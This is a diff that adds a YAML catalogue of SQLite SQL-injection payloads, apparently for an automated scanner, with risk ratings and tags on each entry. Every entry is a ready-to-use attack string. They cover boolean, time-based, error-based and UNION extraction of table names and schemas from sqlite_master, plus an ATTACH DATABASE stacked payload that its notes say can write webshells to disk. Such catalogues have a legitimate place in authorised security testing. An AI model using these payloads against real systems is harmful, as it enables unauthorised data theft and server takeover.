@@ -1,0 +1,301 @@
+defaults:
+  vuln_type: sqli
+  db_engine: sqlite
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # Blind boolean-based
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "'AND 1=1--"
+    notes: "Boolean true for SQLite. No space after quote."
+    tags: [confirmation, baseline, sqlite]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "'AND 1=2--"
+    notes: "Boolean false for SQLite. No space after quote."
+    tags: [confirmation, baseline, sqlite]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT LENGTH(sqlite_version()))>THRESHOLD--"
+    placeholders: [THRESHOLD]
+    notes: "Extract SQLite version length via boolean oracle."
+    tags: [extraction, version]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND UNICODE(SUBSTR((SELECT sql FROM sqlite_master LIMIT 1),CHAR_POS,1))>THRESHOLD--"
+    placeholders: [CHAR_POS, THRESHOLD]
+    notes: "Extract table schema char-by-char from sqlite_master."
+    tags: [extraction, sqlite_master, binary_search]
+
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "1 AND 1=1--"
+    notes: "Numeric boolean true for SQLite. No space before comment marker (SQLite tolerates this)."
+    tags: [confirmation, numeric, sqlite]
+
+  - technique: blind_boolean
+    injection_surface: json_body
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "'AND 1=1--"
+    notes: "Boolean true via JSON body for SQLite."
+    tags: [confirmation, json, sqlite]
+
+  - technique: blind_boolean
+    injection_surface: form_body
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "'AND 1=1--"
+    notes: "Boolean true via form body parameter for SQLite."
+    tags: [confirmation, form_body, sqlite]
+
+  - technique: blind_boolean
+    injection_surface: cookie
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "'AND 1=1--"
+    notes: "Boolean true via cookie value injection for SQLite."
+    tags: [confirmation, cookie, sqlite]
+
+  # LIKE-based boolean extraction (alternative to GLOB)
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) LIKE 'PATTERN%'--"
+    placeholders: [PATTERN]
+    notes: "LIKE-based case-insensitive pattern matching for table name extraction. Alternative to GLOB."
+    tags: [like, extraction, sqlite_master]
+
+  # Subquery-based enumeration of sqlite_master
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND LENGTH((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET TABLE_INDEX))>THRESHOLD--"
+    placeholders: [TABLE_INDEX, THRESHOLD]
+    notes: "Extract length of Nth table name via OFFSET-based enumeration."
+    tags: [extraction, sqlite_master, offset_enum]
+
+  # Blind time-based (heavy query approach -- SQLite has no SLEEP)
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3) t1, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t2, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t3, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t4, (SELECT 1 UNION SELECT 2 UNION SELECT 3) t5)--"
+    notes: "Heavy query time-based blind. Generates 3^5=243 rows via cartesian product. Adjust nesting for longer delay."
+    tags: [heavy_query, timing]
+
+  # randomblob() timing side-channel
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 2
+    payload: "' AND (SELECT randomblob(500000000))--"
+    notes: "Generate large random blob to induce measurable delay. Adjust size to calibrate timing."
+    tags: [randomblob, timing, sqlite]
+
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 3
+    payload: "' AND CASE WHEN (UNICODE(SUBSTR((SELECT name FROM sqlite_master LIMIT 1),CHAR_POS,1))>THRESHOLD) THEN randomblob(500000000) ELSE 0 END--"
+    placeholders: [CHAR_POS, THRESHOLD]
+    notes: "Conditional randomblob timing for data extraction. Only generates delay when condition is true."
+    tags: [randomblob, conditional, extraction, timing]
+
+  # Error-based
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 2
+    payload: "' AND 1=CAST(sqlite_version() AS int)--"
+    notes: "Force type error to leak SQLite version. Requires error messages in response."
+    tags: [version, cast_error]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT sql FROM sqlite_master LIMIT 1) AS int)--"
+    notes: "Leak table schema via cast error from sqlite_master."
+    tags: [sqlite_master, cast_error]
+
+  - technique: error_based
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: error
+    risk: 3
+    payload: "' AND 1=CAST((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) AS int)--"
+    notes: "Leak first table name via cast error."
+    tags: [enumeration, sqlite_master, cast_error]
+
+  # UNION-based
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "'UNION SELECT NULL--"
+    notes: "Column count probe for SQLite."
+    tags: [column_count, probe, sqlite]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT sqlite_version(),NULL,NULL--"
+    notes: "Extract SQLite version via UNION."
+    tags: [version, extraction]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table'--"
+    notes: "Enumerate all tables via UNION from sqlite_master."
+    tags: [enumeration, sqlite_master]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table' AND name='TABLE_NAME'--"
+    placeholders: [TABLE_NAME]
+    notes: "Get CREATE TABLE statement to see column definitions."
+    tags: [enumeration, sqlite_master, schema]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT GROUP_CONCAT(name),NULL,NULL FROM sqlite_master WHERE type='table'--"
+    notes: "All table names in one row."
+    tags: [enumeration, group_concat]
+
+  # JSON functions (modern SQLite >=3.9.0)
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT json_group_array(name),NULL,NULL FROM sqlite_master WHERE type='table'--"
+    notes: "Enumerate tables as JSON array via json_group_array. Requires SQLite >=3.9.0."
+    tags: [json, enumeration, sqlite_master]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "' UNION SELECT json_extract(COLUMN_NAME,'$.KEY_PATH'),NULL,NULL FROM TABLE_NAME LIMIT 1--"
+    placeholders: [COLUMN_NAME, KEY_PATH, TABLE_NAME]
+    notes: "Extract nested value from JSON column via json_extract. Useful when app stores JSON blobs."
+    tags: [json, json_extract, extraction]
+
+  # ATTACH DATABASE for file write
+  - technique: blind_time
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: timing
+    risk: 5
+    payload: "'; ATTACH DATABASE 'OUTPUT_PATH' AS pwn; CREATE TABLE pwn.d(data TEXT); INSERT INTO pwn.d VALUES('PAYLOAD_CONTENT'); DETACH DATABASE pwn;--"
+    placeholders: [OUTPUT_PATH, PAYLOAD_CONTENT]
+    notes: "Write arbitrary content to disk via ATTACH DATABASE. Can write webshells if writable web root is known. DESTRUCTIVE."
+    tags: [attach_database, file_write, destructive, stacked]
+
+  # GLOB-based boolean (SQLite-specific)
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 3
+    payload: "' AND (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) GLOB 'PATTERN*'--"
+    placeholders: [PATTERN]
+    notes: "SQLite GLOB for case-sensitive pattern matching on table names. Iterate chars to extract."
+    tags: [glob, extraction, sqlite_master]
+
+  # typeof() probe (SQLite-specific)
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "' AND typeof(COLUMN_NAME)='text'--"
+    placeholders: [COLUMN_NAME]
+    notes: "SQLite typeof() to determine column type. Returns text/integer/real/blob/null."
+    tags: [typeof, probe, schema]
+
+  # URL-encoded
+  - technique: blind_boolean
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "%27AND%201%3D1--"
+    notes: "URL-encoded boolean true for SQLite."
+    tags: [confirmation, url_encoded, sqlite]
+
+  - technique: union
+    injection_surface: query
+    encoding: url
+    string_boundary: single_quote
+    evidence_type: content_match
+    risk: 2
+    payload: "%27UNION%20SELECT%20NULL--"
+    notes: "URL-encoded UNION probe for SQLite."
+    tags: [column_count, probe, url_encoded, sqlite]
+
+  # Double-quote boundary
+  - technique: blind_boolean
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: boolean_diff
+    risk: 2
+    payload: "\"AND 1=1--"
+    notes: "Double-quote boolean true for SQLite."
+    tags: [confirmation, double_quote, sqlite]
+
+  - technique: union
+    injection_surface: query
+    string_boundary: double_quote
+    evidence_type: content_match
+    risk: 3
+    payload: "\" UNION SELECT sqlite_version(),NULL,NULL--"
+    notes: "Double-quote UNION version extraction."
+    tags: [version, extraction, double_quote]
